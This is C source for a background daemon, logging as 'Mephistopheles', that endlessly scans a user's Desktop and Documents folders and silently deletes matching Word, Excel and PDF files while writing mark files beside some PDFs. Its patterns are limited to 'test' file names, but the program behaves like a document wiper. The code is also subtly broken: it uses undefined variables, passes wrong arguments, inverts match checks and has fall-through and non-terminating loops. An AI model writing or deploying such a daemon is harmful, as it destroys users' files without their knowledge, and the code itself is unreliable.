#include <unistd.h>
#include <syslog.h>
#include <fnmatch.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <linux/sched.h>

// Confined, will add marks
char *confined_dirs[] = {
    "/home/user/test/",
};

// remove files from here
char *remove_dirs[] = { 
    "/home/user/Desktop",
    "/home/user/Documents"
};

// controlled extensions
char* remove_patterns[] = {
    "test*.doc",
    "test*.docx",
    "test*.xls",
    "test*.xlsx",
    "test*.pdf",
    NULL
};

char* mark_patterns[] = {
    "test*.pdf",
    NULL
};

char* file_mark_ext = "_LtH4Dk";

enum action_type {
    MARK_FILE,
    REMOVE_FILE
};

static char* make_full_path(char* dir, char* filename, char* ext_add)
{
    char* fullname = malloc(strlen(dir) + 1 + strlen(filename) + (ext_add ? strlen(ext_add) : 0) + 1);
    sprintf(fullname, "%s/%s", dir, filename);
    if (ext_add)
        strcat(fullname, ext_add);
    return fullname;
}

static void file_action(char* dir, struct dirent *ep, enum action_type action)
{
    switch(action) {
        case MARK_FILE:
            {
                char** m_ext = mark_patterns;
                for (; m_ext; m_ext++)
                    if(fnmatch(m_ext, ep->d_name, 0)) {
                        //create mark
                        char* fmark_name = make_full_path(dir, ep->d_name, file_mark_ext);
                        FILE* fmark = fopen(fmark_name, "w");
                        fprintf(fmark, "00000004 00000004");
                        fclose(fmark);
                        syslog(LOG_DEBUG, "Marked '%s/%s' by '%s'", dir, ep->d_name, fmark_name);
                        free(fmark_name);
                    }
            }
        case REMOVE_FILE:
            {
                char** ext;
                for (ext = remove_patterns; *ext; ext++)
                    if(fnmatch(ext, ep->d_name, 0)) {
                        //remove
                        char *full_path = make_full_path(dir, ep->d_name, NULL);
                        unlink(full_path);
                        syslog(LOG_DEBUG, "Removed '%s'", full_path);
                        free(full_path);
                    }
            }
        default: ;
    }
}

static void recoursive_search(char* path, enum action_type action)
{
    struct dirent *ep;
    DIR *dir = opendir(path);
    
    if(dir) {
        while ((ep = readdir(dir)) != NULL) {
            switch(ep->d_type) {
                case DT_DIR:    // subdirectory
                    {
                        char* subdir = malloc(strlen(path) + 1 + strlen(ep->d_name) + 1);
                        sprintf(subdir, "%s/%s", path, ep->d_name);
                        recoursive_search(subdir, action);
                        free (subdir);
                    }
                    break;
                case DT_REG:    // regular file
                    {
                        char **ext;
                        for (ext = exts; *ext; ext++)
                            if (fnmatch(*ext, ep->d_name, 0) == 0)
                                file_action(ep, action);
                    }
                default: ;
            }
        }
        closedir(dir);
    }
} 

#define ARRAY_SIZE(arr) sizeof(dirpaths)/sizeof(char*)

int main (int argc, char** argv) {
    pid_t pid;
    // global init

    openlog("Mephistopheles", LOG_PID, LOG_USER);

#ifdef DEBUG
    setlogmask(LOG_UPTO(LOG_DEBUG));
#endif

    pid = daemon(0, 0);
    if (pid < 0) {
        syslog(LOG_CRIT, "Failed to fork!");
        closelog();
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {
        // child
        while (1) {
            size_t i;

            for (i = 0; i < ARRAY_SIZE(confined_dirs); i++) 
                recoursive_search (confined_dirs[i], MARK_FILE);

            for (i = 0; i < ARRAY_SIZE(remove_dirs); i++) 
                recoursive_search (remove_dirs[i], REMOVE_FILE);

            sched_yield();
        }
    }
}